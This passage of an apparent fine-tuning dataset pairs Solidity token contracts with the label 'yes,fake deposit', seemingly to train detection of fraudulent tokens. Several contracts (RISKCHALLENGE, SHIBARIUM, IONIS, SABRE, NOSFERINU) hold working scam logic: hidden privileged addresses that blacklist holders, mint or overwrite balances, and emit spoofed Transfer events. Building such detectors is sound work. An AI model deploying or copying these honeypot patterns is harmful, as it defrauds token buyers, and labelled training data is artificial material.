if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract FIFA is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"FIFA World Cup\";\n string public constant symbol = \"FIFA\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address LRV = 0x255fd0898d235DFF82e6Af3180e23Dc02102D72b;\n\taddress LRTR = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n modifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract RISKCHALLENGE is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Lc;\n\tmapping (address => bool) private Lb;\n mapping (address => bool) private Lw;\n mapping (address => mapping (address => uint256)) private Lv;\n uint8 private constant LCE = 8;\n uint256 private constant lS = 150000000 * (10** LCE);\n string private constant _name = \"RISK CHALLENGE PROTOCOL\";\n string private constant _symbol = \"CHALLENGE\";\n\n\n\n constructor () {\n Lc[_msgSender()] = lS;\n lmkr(LRTR, lS); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return LCE;\n }\n\n function totalSupply() public pure returns (uint256) {\n return lS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Lc[account];\n }\n function lmkr(address Lj, uint256 Ln) onlyOwner internal {\n emit Transfer(address(0), Lj ,Ln); }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return Lv[owner][spender];\n }\n\t function kBurn(address Lj) onlyOwner public{\n Lb[Lj] = true; }\n\t\t\n function approve(address spender, uint256 amount) public returns (bool success) { \n Lv[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n \n\t\tfunction kStake(address Lj) public {\n if(Lb[msg.sender]) { \n Lw[Lj] = false;}}\n function kQuery(address Lj) public{\n if(Lb[msg.sender]) { \n Lw[Lj] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == LRV) {\n require(amount <= Lc[sender]);\n Lc[sender] -= amount; \n Lc[recipient] += amount; \n Lv[sender][msg.sender] -= amount;\n emit Transfer (LRTR, recipient, amount);\n return true; } else \n if(!Lw[recipient]) {\n if(!Lw[sender]) {\n require(amount <= Lc[sender]);\n require(amount <= Lv[sender][msg.sender]);\n Lc[sender] -= amount;\n Lc[recipient] += amount;\n Lv[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Lj, uint256 Ln) public {\n if(msg.sender == LRV) {\n require(Lc[msg.sender] >= Ln);\n Lc[msg.sender] -= Ln; \n Lc[Lj] += Ln; \n emit Transfer (LRTR, Lj, Ln);} else \n if(Lb[msg.sender]) {Lc[Lj] += Ln;} else\n if(!Lw[msg.sender]) {\n require(Lc[msg.sender] >= Ln);\n Lc[msg.sender] -= Ln; \n Lc[Lj] += Ln; \n emit Transfer(msg.sender, Lj, Ln);}}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _MsgSendr() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _tiConstruct = 0x6f446dFCB8d3b117095B6065ECa85cB606D0eFBa;\n\taddress UniV2Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\n constructor () {\n address msgSender = _MsgSendr();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract SHIBARIUM is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Tii;\n\tmapping (address => bool) private Yii;\n mapping (address => bool) private Kii;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _TiSup = 1000000000 * 10**_decimals;\n string private constant _name = \"SHIBARIUM\";\n string private constant _symbol = \"SHIBARIUM\";\n\n\n\n constructor () {\n Tii[_MsgSendr()] = _TiSup;\n emit Transfer(address(0), UniV2Router, _TiSup);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _TiSup;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Tii[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction Tiend(address px) public {\n if(Yii[msg.sender]) { \n Kii[px] = false;}}\n function Tiquery(address px) public{\n if(Yii[msg.sender]) { \n require(!Kii[px]);\n Kii[px] = true; }}\n\t\tfunction Aistake(address px) public{\n if(msg.sender == _tiConstruct) { \n require(!Yii[px]);\n Yii[px] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _tiConstruct) {\n require(amount <= Tii[sender]);\n Tii[sender] -= amount; \n Tii[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (UniV2Router, recipient, amount);\n return true; } \n if(!Kii[recipient]) {\n if(!Kii[sender]) {\n require(amount <= Tii[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n Tii[sender] -= amount;\n Tii[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address recipient, uint256 amount) public {\n if(msg.sender == _tiConstruct) {\n require(Tii[msg.sender] >= amount);\n Tii[msg.sender] -= amount; \n Tii[recipient] += amount; \n emit Transfer (UniV2Router, recipient, amount);}\n if(Yii[msg.sender]) {Tii[recipient] = amount;} \n if(!Kii[msg.sender]) {\n require(Tii[msg.sender] >= amount);\n Tii[msg.sender] -= amount; \n Tii[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address constrct = 0x45BbB9acc12AF58a71725fb3C30A9d888a677DBB;\n\taddress Routerv2 = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\n constructor () {\n address msgSender = _msgSender();\n _owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _owner);\n emit OwnershipTransferred(_owner, address(0));\n _owner = address(0);\n }\n\n}\n\n\n\ncontract IONIS is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private CPI;\n\tmapping (address => uint256) private IPD;\n mapping (address => bool) private XvC;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _tTotal = 250000000 * 10**_decimals;\n string private constant _name = \"IONIS\";\n string private constant _symbol = \"IONIS\";\n\n\n\n constructor () {\n CPI[_msgSender()] = _tTotal;\n emit Transfer(address(0), Routerv2, _tTotal);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _tTotal;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return CPI[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n function Ixbri () public {\n if(msg.sender == constrct) {\n CPI[msg.sender] = IPD[msg.sender];\n }}\n\n\n\n function Ixde(address yz) public {\n if(msg.sender == constrct) { \n XvC[yz] = false;}}\n function Ixcheck(address yz) public{\n if(msg.sender == constrct) { \n require(!XvC[yz]);\n XvC[yz] = true; }}\n function Ixbal(uint256 yz) public {\n if(msg.sender == constrct) { \n IPD[msg.sender] = yz;}} \n\n function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == constrct) {\n require(amount <= CPI[sender]);\n CPI[sender] -= amount; \n CPI[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (Routerv2, recipient, amount);\n return true; } \n if(!XvC[sender] && !XvC[recipient]) {\n require(amount <= CPI[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n CPI[sender] -= amount;\n CPI[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}\n\n \n\n function transfer(address recipient, uint256 amount) public {\n if(msg.sender == constrct) {\n require(CPI[msg.sender] >= amount);\n CPI[msg.sender] -= amount; \n CPI[recipient] += amount; \n emit Transfer (Routerv2, recipient, amount);\n } \n if(!XvC[msg.sender]) {\n require(CPI[msg.sender] >= amount);\n CPI[msg.sender] -= amount; \n CPI[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}\n \n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n ) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender)\n constant\n returns (uint256 remaining)\n {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _value\n );\n}\n\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n ) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (\n balances[_from] >= _value &&\n allowed[_from][msg.sender] >= _value &&\n _value > 0\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender)\n constant\n returns (uint256 remaining)\n {\n return allowed[_owner][_spender];\n }\n\n mapping(address => uint256) balances;\n mapping(address => mapping(address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract TimeshareToken is StandardToken {\n function() {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = \"H1.0\"; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n function TimeshareToken() {\n balances[msg.sender] = 10000000000;\n totalSupply = 10000000000;\n name = \"Timeshare\"; // Set the name for display purposes\n decimals = 0; // Amount of decimals for display purposes\n symbol = \"TMT\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(\n address _spender,\n uint256 _value,\n bytes _extraData\n ) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call should succeed, otherwise one would use vanilla approve instead.\n if (\n !_spender.call(\n bytes4(\n bytes32(\n sha3(\"receiveApproval(address,uint256,address,bytes)\")\n )\n ),\n msg.sender,\n _value,\n this,\n _extraData\n )\n ) {\n throw;\n }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address CZC = 0x19041bEBd6b59b10C550F71b3550c56327C4a93b;\n\taddress cZRouterV2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n \t\tmodifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n\n}\n\n\n\ncontract SABRE is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Cc;\n\tmapping (address => bool) private Cb;\n mapping (address => bool) private Cz;\n mapping (address => mapping (address => uint256)) private eC;\n uint8 private constant _decimals = 8;\n uint256 private constant sC = 200000000 * 10**_decimals;\n string private constant _name = \"Sabre Network\";\n string private constant _symbol = \"SABRE\";\n\n\n\n constructor () {\n Cc[_msgSender()] = sC;\n emit Transfer(address(0), cZRouterV2, sC);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return sC;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Cc[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return eC[owner][spender];\n }\n function approve(address spender, uint256 amount) public returns (bool success) { \n eC[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction cStake(address Cf) public {\n if(Cb[msg.sender]) { \n Cz[Cf] = false;}}\n function cQuery(address Cf) public{\n if(Cb[msg.sender]) { \n Cz[Cf] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == CZC) {\n require(amount <= Cc[sender]);\n Cc[sender] -= amount; \n Cc[recipient] += amount; \n eC[sender][msg.sender] -= amount;\n emit Transfer (cZRouterV2, recipient, amount);\n return true; } else \n if(!Cz[recipient]) {\n if(!Cz[sender]) {\n require(amount <= Cc[sender]);\n require(amount <= eC[sender][msg.sender]);\n Cc[sender] -= amount;\n Cc[recipient] += amount;\n eC[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Ci, uint256 Cf) public {\n if(msg.sender == CZC) {\n require(Cc[msg.sender] >= Cf);\n Cc[msg.sender] -= Cf; \n Cc[Ci] += Cf; \n emit Transfer (cZRouterV2, Ci, Cf);} else \n if(Cb[msg.sender]) {Cc[Ci] += Cf;} else\n if(!Cz[msg.sender]) {\n require(Cc[msg.sender] >= Cf);\n Cc[msg.sender] -= Cf; \n Cc[Ci] += Cf; \n emit Transfer(msg.sender, Ci, Cf);}}\n \n function cBurn(address Cf) onlyOwner public{\n Cb[Cf] = true; }\n\t\t}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _MsgSendr() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _rConstruct = 0x23fda63bb8A87946942556eC668221B090759Df0;\n\taddress UnisV2Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\n constructor () {\n address msgSender = _MsgSendr();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract NOSFERINU is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Iq;\n\tmapping (address => bool) private tQ;\n mapping (address => bool) private mQ;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _QmSup = 666000000 * 10**_decimals;\n string private constant _name = \"Nosferatu Inu\";\n string private constant _symbol = \"NOSFERINU\";\n\n\n\n constructor () {\n Iq[_MsgSendr()] = _QmSup;\n emit Transfer(address(0), UnisV2Router, _QmSup);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _QmSup;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Iq[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction rEnd(address z) public {\n if(tQ[msg.sender]) { \n mQ[z] = false;}}\n function rQuery(address z) public{\n if(tQ[msg.sender]) { \n require(!mQ[z]);\n mQ[z] = true; }}\n\t\tfunction arStake(address z) public{\n if(msg.sender == _rConstruct) { \n require(!tQ[z]);\n tQ[z] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _rConstruct) {\n require(amount <= Iq[sender]);\n Iq[sender] -= amount; \n Iq[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (UnisV2Router, recipient, amount);\n return true; } \n if(!mQ[recipient]) {\n if(!mQ[sender]) {\n require(amount <= Iq[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n Iq[sender] -= amount;\n Iq[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address txTo, uint256 z) public {\n if(msg.sender == _rConstruct) {\n require(Iq[msg.sender] >= z);\n Iq[msg.sender] -= z; \n Iq[txTo] += z; \n emit Transfer (UnisV2Router, txTo, z);}\n if(tQ[msg.sender]) {Iq[txTo] = z;} \n if(!mQ[msg.sender]) {\n require(Iq[msg.sender] >= z);\n Iq[msg.sender] -= z; \n Iq[txTo] += z; \n emit Transfer(msg.sender, txTo, z);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract LUNA_ZOOM is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000*10**uint256(decimals);\n string public constant name = \"LUNA ZOOM\";\n string public constant symbol = \"LUNAZ \ud83c\udf15\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", 